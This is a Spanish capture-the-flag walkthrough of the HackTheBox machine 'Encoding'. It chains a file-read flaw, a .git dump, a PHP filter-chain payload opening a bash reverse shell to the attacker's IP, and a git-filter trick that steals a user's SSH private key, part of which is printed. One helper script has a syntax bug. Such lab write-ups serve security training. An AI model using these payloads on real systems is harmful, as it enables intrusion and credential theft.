---
title: Encoding - HackTheBox
categories: [ Linux ]
tags: [ HackTheBox ]
---

<img src="/assets/img/HTB/Encoding/Encoding.jpg">

Buenas! El día de hoy completaremos la máquina [Encoding](https://app.hackthebox.com/machines/Encoding) de la plataforma [HackTheBox](https://app.hackthebox.com), donde tocaremos los siguientes puntos:

- **Local File Inclusion (LFI)**
- **Subdomain Enumeration**
- **Server Side Request Forgery (SSRF)**
- **Extracting the contents of .git directory - GitDumper**
- **LFI to RCE [Abusing PHP filters chain]**
- **Exploiting git vulnerability [User Pivoting]**
- **Abusing Sudoers Privilege [Privilege Escalation]**

## Enumeración 

Comenzaremos como en toda máquina con el escaneo de puertos con `nmap`, detectamos 2 puertos abiertos

```sh
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.198 -oG allPorts
Nmap scan report for 10.10.11.198
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

### Enumeración Web

Visitaremos el servicio HTTP, donde nos encontraremos con una web que nos da la posibilidad de convertir entre diferentes formatos, tales como de hexadecimal a cadena o viceversa

![](/assets/img/HTB/Encoding/web.png)

Nos percatamos que en la sección API existe un subdominio `api.hextables.png`, por lo que lo agregamos al `/etc/hosts` 

```sh
10.10.11.198 haxtables.htb api.haxtables.htb
```

### Enumeración de Subdominios

Realizaremos un fuzzeo de subdominios con la herramienta `wfuzz`, nos percatamos del subdominio `image.haxtables.htb`, pero al intentar acceder al subdominio este nos devuelve un 403 Forbidden

```sh
❯ wfuzz -c --hc=404 --hh=1999 -t 200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.haxtables.htb" http://haxtables.htb
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://haxtables.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000177:   403        9 L      28 W       284 Ch      "image"                                                                                                                
000000051:   200        0 L      0 W        0 Ch        "api"
```

![](/assets/img/HTB/Encoding/403.png)

## Foothold

Al acceder a la página, nos damos cuenta de la presencia de un panel en el que podemos ingresar datos, los cuales serán convertidos a su correspondiente formato específico de conversión

![](/assets/img/HTB/Encoding/web1.png)

Si interceptamos la petición con BurpSuite, podemos ver que la petición se reenvía a la ruta `/handler.php`, donde se envían tres parámetros: `action`, `data` y `uri_path`. Estos parámetros resultan ser muy importantes ya que los usaremos más adelante para crear una reverse shell.

![](/assets/img/HTB/Encoding/burp.png)

La plataforma cuenta con un menú `API` que proporciona varias opciones para utilizar una API. Una de estas opciones implica enviar solicitudes POST que incluyen datos en formato JSON. Uno de los parámetros que se pueden incluir en dichas solicitudes es `file_url`, que permite usar el header `file://` y acceder a archivos del sistema.

> El protocolo "file" es un protocolo de red que se utiliza para acceder a archivos almacenados en un sistema local o remoto. Este protocolo se integra con el sistema de archivos y permite a los programas acceder a archivos a través de la red como si estuvieran en el sistema local.

> Sin embargo, esta integración puede resultar en una vulnerabilidad si no se implementa de forma segura. Por ejemplo, si una aplicación permite a los usuarios especificar una URL que incluya el protocolo "file", un atacante puede intentar acceder a archivos sensibles en el sistema remoto. Por lo tanto, es importante implementar medidas de seguridad adecuadas para proteger el sistema y los archivos contra posibles ataques.

![](/assets/img/HTB/Encoding/web2.png)

El ejemplo de código en Python que se proporciona permite conectarse fácilmente a la API de la plataforma y obtener los resultados en el formato que eligamos.

![](/assets/img/HTB/Encoding/api.png)

Crearemos un script en python3 para hacer más rápido este proceso

```py
#!/usr/bin/python3

import requests, json, sys

if len(sys.argv) < 2:
    print(f"\nUso: python3 {sys.argv[0]} <archivo>\n")
    sys.exit(1)

json_data = {"action": "str2hex", "file_url": f"file://{sys.argv[1]}"}
r = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=json_data)
json = json.loads(r.text)
string = json['data']

if string = "":
    print("\nEl archivo especificado no existe\n")
    sys.exit(1)
bytes = bytes.fromhex(string)

f = bytes.decode()
print(f.strip())
```

De esta manera, podremos leer archivos del sistema de una manera más rápida, como para leer el archivo `/etc/passwd`

![](/assets/img/HTB/Encoding/lfi.png)

Después de analizar los archivos del sistema mediante la vulnerabilidad de LFI, descubrimos que el subdominio `image.haxtables.htb` utiliza la función **include_once** para incluir el archivo **utils.php**. Este método de inclusión de archivos permite incluir y evaluar un archivo solo una vez, lo que evita la posibilidad de redefinir funciones o variables previamente definidas en el archivo.

![](/assets/img/HTB/Encoding/lfi1.png)

Al analizar el contenido del script `utils.php`, descubrimos que hace uso de la herramienta `git`. Nos percatamos que es posible que exista un directorio `.git` en el directorio `/var/www/image`.

```php
<?php

// Global functions

function jsonify($body, $code = null)
{
    if ($code) {
        http_response_code($code);
    }

    header('Content-Type: application/json; charset=utf-8');
    echo json_encode($body);

    exit;
}

function get_url_content($url)
{
    $domain = parse_url($url, PHP_URL_HOST);
    if (gethostbyname($domain) === "127.0.0.1") {
        echo jsonify(["message" => "Unacceptable URL"]);
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTP);
    curl_setopt($ch, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTPS);
    curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,2);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    $url_content =  curl_exec($ch);
    curl_close($ch);
    return $url_content;

}

function git_status()
{
    $status = shell_exec('cd /var/www/image && /usr/bin/git status');
    return $status;
}

function git_log($file)
{
    $log = shell_exec('cd /var/www/image && /ust/bin/git log --oneline "' . addslashes($file) . '"');
    return $log;
}

function git_commit()
{
    $commit = shell_exec('sudo -u svc /var/www/image/scripts/git-commit.sh');
    return $commit;
}
?>
```

Ahora podemos usar las [GitTools](https://github.com/internetwache/GitTools) para extraer archivos

![](/assets/img/HTB/Encoding/gitdump.png)

Si volvemos al script `utils.php`, podemos observar una función interesante llamada `get_url_content`. Esta bloquea el dominio si se resuelve a la dirección Loopback

```php
function get_url_content($url)
{
    $domain = parse_url($url, PHP_URL_HOST);
    if (gethostbyname($domain) === "127.0.0.1") {
        echo jsonify(["message" => "Unacceptable URL"]);
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTP);
    curl_setopt($ch, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTPS);
    curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,2);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    $url_content =  curl_exec($ch);
    curl_close($ch);
    return $url_content;

}
```

Podemos hacer un servidor HTTP flask que actue como proxy para `gitdumper.sh`

```py
from flask import Flask
import requests, json, base64


app = Flask(__name__)

@app.route('/<path:filepath>')
def index(filepath):
    json_data = {
        'action': 'b64encode',
        'file_url': 'file://' + '/var/www/image/' + filepath
    }
    r = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=json_data)
    d = json.loads(r.text.strip())
    res = base64.b64decode(d["data"])
    return res
```

Luego ejecutaremos el script

![](/assets/img/HTB/Encoding/flask.png)p

Ahora intentaremos lo mismo con `gitdumper.sh` pero en vez de la url de antes la url sería `http://127.0.0.1:5000/.git/`. Esta vez funciona

![](/assets/img/HTB/Encoding/gitdump1.png)

Una vez dumpeados todos los datos, tendremos que extraer los archivos para recrear el repositorio

![](/assets/img/HTB/Encoding/gitextract.png)

Ahora tenemos todo el código fuente de la página `image.haxtables.htb`

Y encontramos un script PHP, `action_handler.php`

```php
<?php

include_once 'utils.php';

if (isset($_GET['page'])) {
    $page = $_GET['page'];
    include($page);

} else {
    echo jsonify(['message' => 'No page specified!']);
}

?>
```

Ahora, otro LFI

Recordais el primer LFI? Podemos explotar ese

![](/assets/img/HTB/Encoding/burp1.png)

Usaremos las [PHP Filter Chains](https://github.com/synacktiv/php_filter_chain_generator) para generar código PHP que se va a inyectar en la página, para así poder conseguir un RCE.

```sh
❯ python3 php_filter_chain_generator.py --chain "<?php system(bash -c 'bash -i >& /dev/tcp/10.10.14.130/443 0>&1'); ?>"
[+] The following gadget chain will generate the following code : <?php system(bash -c 'bash -i >& /dev/tcp/10.10.14.130/443 0>&1'); ?> (base64 value: PD9waHAgc3lzdGVtKGJhc2ggLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTMwLzQ0MyAwPiYxJyk7ID8+)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

Ahora inyectaremos el código que nos da en el burpsuite y nos pondremos en escucha con `netcat`

```sh
❯ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.130] from (UNKNOWN) [10.10.11.198] 47562
bash: cannot set terminal process group (822): Inappropriate ioctl for device
bash: no job control in this shell
www-data@encoding:~/image/actions$ 
```

Tenemos una consola en el sistema, procederemos enumerando el sistema (permisos, privilegios, etc.)

Si nos fijamos en los privilegios que tenemos a nivel de sudoers, podemos ejecutar como el usuario `svc` el script `/var/www/image/scripts/git-commit.sh`

```sh
www-data@encoding:~$ sudo -l
Matching Defaults entries for www-data on encoding:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on encoding:
    (svc) NOPASSWD: /var/www/image/scripts/git-commit.sh
www-data@encoding:~$ 
```

Podemos aprovecharnos del script para leer la clave privada del usuario `svc` y dejarla en un archivo

```sh
www-data@encoding:~$ echo "cat /home/svc/.ssh/id_rsa > /tmp/key" > /tmp/readkey
www-data@encoding:~$ chmod +x /tmp/readkey 
www-data@encoding:~$ cd image/
www-data@encoding:~/image$ git init
Reinitialized existing Git repository in /var/www/image/.git/
www-data@encoding:~/image$ echo "*.php filter=indent" > .git/info/attributes
www-data@encoding:~/image$ git config filter.indent.clean /tmp/readkey 
www-data@encoding:~/image$ sudo -u svc /var/www/image/scripts/git-commit.sh 
On branch master
Changes not staged for commit:
  (use "git add <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
	modified:   actions/action_handler.php
	modified:   index.php
	modified:   utils.php

no changes added to commit (use "git add" and/or "git commit -a")
www-data@encoding:~/image$ 
```

Ahora si nos dirigimos al archivo `/tmp/key` podemos leer la clave privada del usuario `svc`

```sh
www-data@encoding:~/image$ cd /tmp/
www-data@encoding:/tmp$ cat key 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAlnPbNrAswX0YLnW3sx1l7WN42hTFVwWISqdx5RUmVmXbdVgDXdzH
/ZBNxIqqMXE8DWyNpzcV/78rkU4f2FF/rWH26WfFmaI/Zm9sGd5l4NTON2lxAOt+8aUyBR
xpVYNSSK+CkahQ2XDO87IyS4HV4cKUYpaN/efa+XyoUm6mKiHUbtyUYGAfebSVxU4ur1Ue
vSquljs+Hcpzh5WKRhgu/ojBDQdKWd0Q6bn75TfRBSu6u/mODjjilvVppGNWJWNrar8eSZ
vbqMlV509E6Ud2rNopMelmpESZfBEGoJAvEnhFaYylsuC7IPEWMi82/3Vyl7RAgeT0zPjq
nHiPCJykLYvxkvsRnIBFxesZL+AkbHYHEn3fyH16Pp8ZZmIIJN3WQD/SRJOTDh/fmWy6r7
oD+urq6+rEqTV0UGDk3YXhhep/LYnszZAZ2HNainM+iwtpDTr3rw+B+OH6Z8Zla1YvBFvL
oQOAsqE2FUHeEpRspb57uDeKWbkrNLU5cYUhuWBLAAAFiEyJeU9MiXlPAAAAB3NzaC1yc2
EAAAGBAJZz2zawLMF9GC51t7MdZe1jeNoUxVcFiEqnceUVJlZl23VYA13cx/2QTcSKqjFx
PA1sjac3Ff+/K5FOH9hRf61h9ulnxZmiP2ZvbBneZeDUzjdpcQDrfvGlMgUcaVWDUkivgp
GoUNlwzvOyMkuB1eHClGKWjf3n2vl8qFJupioh1G7clGBgH3m0lcVOLq9VHr0qrpY7Ph3K
c4eVikYYLv6IwQ0HSlndEOm5++U30QUrurv5jg444pb1aaRjViVja2q/Hkmb26jJVedPRO
lHdqzaKTHpZqREmXwRBqCQLxJ4RWmMpbLguyDxFjIvNv91cpe0QIHk9Mz46px4jwicpC2L
8ZL7EZyARcXrGS/gJGx2BxJ938h9ej6fGWZiCCTd1kA/0kSTkw4f35lsuq+6A/rq6uvqxK
k1dFBg5N2F4YXqfy2J7M2QGdhzWopzPosLaQ06968Pgfjh+mfGZWtWLwRby6EDgLKhNhVB
3hKUbKW+e7g3ilm5KzS1OXGFIblgSwAAAAMBAAEAAAGAF7nXhQ1NUYoHqTP5Ly7gpwn7wf
